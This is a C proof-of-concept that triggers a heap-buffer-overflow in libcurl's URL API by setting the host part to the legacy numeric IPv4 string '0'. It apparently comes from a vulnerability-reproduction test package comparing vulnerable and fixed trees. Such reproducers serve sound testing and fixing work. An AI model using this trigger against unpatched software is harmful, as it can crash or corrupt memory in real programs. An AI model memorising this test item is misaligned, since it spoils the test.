/* Heap-buffer-overflow in curl_url_set(CURLUPART_HOST, ...) when the host
 * is a short legacy numeric IPv4 spelling that expands when normalized to
 * dotted decimal (e.g. "0" -> "0.0.0.0"). Build and link against libcurl,
 * then run with no arguments. Fires under AddressSanitizer on the shipped
 * (vulnerable) tree; does not fire on the golden (fixed) tree. */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLU *u = curl_url();
  CURLUcode uc;

  if(!u) {
    fprintf(stderr, "curl_url() failed\n");
    return 2;
  }

  uc = curl_url_set(u, CURLUPART_SCHEME, "http", 0);
  if(uc) {
    fprintf(stderr, "set scheme failed: %d\n", uc);
    return 2;
  }

  /* "0" is a legal legacy numeric IPv4 host (normalizes to "0.0.0.0" per
   * the full-URL parser); setting it directly through CURLUPART_HOST is
   * ordinary, documented, in-contract use of the public URL API. */
  uc = curl_url_set(u, CURLUPART_HOST, "0", 0);
  if(uc) {
    fprintf(stderr, "set host failed: %d\n", uc);
    curl_url_cleanup(u);
    return 2;
  }

  {
    char *host = NULL;
    curl_url_get(u, CURLUPART_HOST, &host, 0);
    printf("host: %s\n", host ? host : "(null)");
    curl_free(host);
  }

  curl_url_cleanup(u);
  return 0;
}
